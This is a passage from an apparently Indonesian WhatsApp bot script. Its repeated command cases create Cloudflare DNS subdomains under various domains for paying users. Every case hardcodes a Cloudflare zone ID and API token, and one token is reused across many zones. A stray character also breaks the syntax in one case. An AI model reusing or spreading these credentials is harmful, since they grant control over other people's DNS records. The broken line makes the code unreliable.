               let tld = "panell-net.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5e9c879001b63885301e77f48c3d7e58";
               let apitoken = "6ZiDzBlwT8jcdS30TIyQg2wnGU067U1OXnqn5Gzc";
               let tld = "panellshop.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff STORE_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fa2790178cc13b4b23425274cf2540a3";
               let apitoken = "fotJyRsvKzJe3AV_aAXZmeskVPuJk3QLg8CEYSD4";
               let tld = "panellshop.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain12': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "db7ee82aaf8f9ac8f61a26b64809f224";
               let apitoken = "Zq5C0hxbwvLFNUFCz2NgakcwteIi9fNwtUL1WYNi";
               let tld = "panell-tech.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain13': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ce8b69c52cb2fb64ede5e4d11f9a9441";
               let apitoken = "6AMrrVzZTp1PZzNcFxLLJFGCHraUoqKN4cRdomg7";
               let tld = "pusatnetid.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain14': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c871b0a866cd104704fac8e81822a24b";
               let apitoken = "5M4zrEruEXVRykN2QQqJ6XdZFE8TmXakKoTKi4PN";
               let tld = "websiteme.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain15': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bc8432c433d22ae80b5fb8319d03110e";
               let apitoken = "OLWB_KSnYvziv2KZVF3MvG3WNIjWRiyvJNaZBBZG";
               let tld = "rzlmodz.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");f
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain16': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f6050b007950c5235499c21863a7ea78";
               let apitoken = "Pb5XfXY_PFUOp9-C2xjiDN3Cd_wNx7VLGz4i3MA_";
               let tld = "tds4youpanel.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain17': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "06a3fe4e7eec313be8ef30b744fcfeb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain18': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "04f62c54a011fe7929342bde68c6deb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "storepannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain19': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cc152c1a6c73b934af4e3c71d47f15db";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokopannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain20': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5efd37e4f4f1186ca6a92d6366b8d485";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain21': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b103a544abad82f68f03395cf8effda";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "adminpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain22': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "10bf5f40f9e6fe74fe5647c2b143de3a";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain23': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5c38f987cf217bfe2bf682d5bb310fe8";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokocpannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain24': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "736705fd97bebdf03ca4a007c2ca4a8f";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "websitepannelmurah.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
